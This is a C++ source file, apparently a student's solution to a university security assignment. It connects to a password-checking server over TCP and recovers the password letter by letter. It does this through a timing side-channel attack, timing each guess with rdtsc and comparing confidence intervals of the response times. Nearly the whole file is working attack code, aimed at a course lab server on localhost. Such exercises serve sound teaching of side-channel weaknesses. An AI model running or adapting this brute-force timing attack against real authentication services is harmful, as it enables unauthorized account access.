/********************************************************************
 * Author:  Carlos Moreno
 * Created: 2019-06
 *
 * Description:
 *
 *      This is a sample code to connect to a server through TCP.
 *      You are allowed to use this as a sample / starting point
 *      for the assignment (both problems require a program that
 *      connects to something).
 *
 *      For the most part, although the file is a .c++ file, the
 *      code is also valid C code  (with some exceptions --- pun
 *      intended! :-) )
 *
 * Copyright and permissions:
 *      This file is for the exclusive purpose of our ECE-458
 *      assignment 1, and you are not allowed to use it for any
 *      other purpose.
 *
 ********************************************************************/

#include <iostream>
#include <sstream>
#include <fstream>
#include <map>
#include <algorithm>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <cerrno>
using namespace std;

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <wait.h>
#include <unistd.h>
#include <math.h>

int socket_to_server (const char * IP, int port);
void process_connection (int server_socket, string user);
string read_packet (int client_socket);
static __inline__ uint64_t rdtsc();

class connection_closed {};
class socket_error {};

const int MAX_ITERATION = 10000;
const char LETTERS[26] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

struct Stat {
    uint64_t mean_total;
    uint64_t square_total;
};

int main(int argc, char * args[])
{
    string host = "127.0.0.1";
    string user = "user1";
    int port = 10458;
    
    if (argc == 2) {
        host = args[1];
    } else if (argc == 3) {
        host = args[1];
        port = atoi(args[2]);
    } else if (argc == 4) {
        host = args[1];
        port = atoi(args[2]);
        user = args[3];
    }
    
    // The function expects an IP address, and not a
    // hostname such as "localhost" or ecelinux1, etc.
    int server_socket = socket_to_server (host.c_str(), port);
    
    if (server_socket != -1)
    {
        process_connection(server_socket, user);
    }
    else
    {
        cout << "Connection not successful" << endl;
    }
    
    return 0;
}

static __inline__ uint64_t rdtsc()
{
    uint32_t hi, lo;
    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)lo) | (((uint64_t)hi) << 32);
}

int socket_to_server (const char * IP, int port)
{
    struct sockaddr_in address;
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr (IP);
    address.sin_port = htons(port);
    
    int sock = socket (AF_INET, SOCK_STREAM, 0);
    
    if (connect (sock, (struct sockaddr *) &address, sizeof(address)) == -1)
    {
        return -1;
    }
    
    return sock;
}

string read_packet (int client_socket)
{
    string msg;
    
    const int size = 8192;
    char buffer[size];
    
    while (true)
    {
        // Though extremely unlikely in our setting --- connection from
        // localhost, transmitting a small packet at a time --- this code
        // takes care of fragmentation  (one packet arriving could have
        // just one fragment of the transmitted message)
        int bytes_read = recv (client_socket, buffer, sizeof(buffer) - 2, 0);
        
        if (bytes_read > 0)
        {
            buffer[bytes_read] = '\0';
            buffer[bytes_read + 1] = '\0';
            
            const char * packet = buffer;
            while (*packet != '\0')
            {
                msg += packet;
                packet += strlen(packet) + 1;
                
                if (msg.length() > 1 && msg[msg.length() - 1] == '\n')
                {
                    istringstream buf(msg);
                    string msg_token;
                    buf >> msg_token;
                    return msg_token;
                }
            }
        }
        else if (bytes_read == 0)
        {
            cout << "CLIENT CLOSE" << endl;
            close (client_socket);
            throw connection_closed();
        }
        else
        {
            cout << "ERROR" << endl;
            cerr << "Error " << errno << endl;
            throw socket_error();
        }
    }
    
    cout << "OPPS" << endl;
    
    throw connection_closed();
}

void process_connection (int server_socket, string user)
{
    try
    {
        const string user_name = user + '\n';
        
        // Send user name to server
        send (server_socket, user_name.c_str(), strlen(user_name.c_str()), MSG_NOSIGNAL);
        usleep(100000);
        
        string solution = "";
        bool success = false;
        
        // Brute force password
        while (!success) {
            char letters[26];
            copy(begin(LETTERS), end(LETTERS), begin(letters));
            
            // Initialize letter hashmap
            map<char, Stat> hashmap;
            for (int i = 0; i < 26; i++) {
                Stat stat;
                stat.mean_total = 0;
                stat.square_total = 0;
                hashmap[letters[i]] = stat;
            }
            
            cout << "Processing ..." << endl;
            cout << "Solution so far: " << solution << endl;
            
            // Brute force password with given solution so far
            for (int i = 0; i < MAX_ITERATION; i++) {
                // Shuffle letter array for fairness
                random_shuffle(begin(letters), end(letters));
                
                // Attempt each letter
                for (int j = 0; j < 26; j++) {
                    char letter = letters[j];
                    string attempt_solution = solution + letter + '\n';

                    // Time the response duration
                    uint64_t start = rdtsc();
                    send (server_socket, attempt_solution.c_str(), strlen(attempt_solution.c_str()), MSG_NOSIGNAL);
                    string result = read_packet(server_socket);
                    uint64_t end = rdtsc();
                    uint64_t duration = end - start;
                    
                    // Update total mean and square for the letter
                    hashmap[letter].mean_total += duration;
                    hashmap[letter].square_total += duration*duration;
                }
            }
            
            char candidate_letter;
            bool found_candidate = false;
            double candidate_mean = 0;
            double candidate_lower_limit = 0;
            double non_candidate_max_upper_limit = 0;
        
            // Calculate confidence interval for each letter
            // http://onlinestatbook.com/2/estimation/mean.html
            for (int i = 0; i < 26; i++) {
                char letter = LETTERS[i];
                Stat stat = hashmap[letter];
                double mean = stat.mean_total / (double) MAX_ITERATION;
                double variance = (stat.square_total - (double) MAX_ITERATION * mean * mean) / (MAX_ITERATION - 1);
                double standard_deviation = sqrt(variance / MAX_ITERATION);
                double upper_limit = mean + double(1.96 * standard_deviation) / sqrt(MAX_ITERATION);
                double lower_limit = mean - double(1.96 * standard_deviation) / sqrt(MAX_ITERATION);
                printf ("%c: mean: %.4f, upper limit: %.4f, lower limit: %.4f\n", LETTERS[i], mean, upper_limit, lower_limit);
                
                // Possible candidate if mean is greater than current max mean
                if (mean > candidate_mean) {
                    // Update candidate if and only if the lower limit is greater than current max upper limit
                    if (lower_limit > non_candidate_max_upper_limit) {
                        candidate_letter = letter;
                        candidate_mean = mean;
                        candidate_lower_limit = lower_limit;
                        found_candidate = true;
                    } else
                        found_candidate = false;
                    
                // Current candidate is not a candidate anymore
                // if the upper limit is greater than candidate lower limit
                } else if (upper_limit > candidate_lower_limit) {
                    if (upper_limit > non_candidate_max_upper_limit)
                        non_candidate_max_upper_limit = upper_limit;
                    found_candidate = false;
                }
            }
            
            // Update solution
            if (found_candidate)
                solution += candidate_letter;
            
            // Check current password solution
            string attempt_solution = solution + '\n';
            send(server_socket, attempt_solution.c_str(), strlen(attempt_solution.c_str()), MSG_NOSIGNAL);
            string result = read_packet(server_socket);
            if (result.compare("ok") == 0)
                break;
        }
        
        cout << "Solution found: " << solution << endl;
        
        close (server_socket);
    }
    catch (connection_closed)
    {
    }
    catch (socket_error)
    {
        cerr << "Socket error" << endl;
    }
}
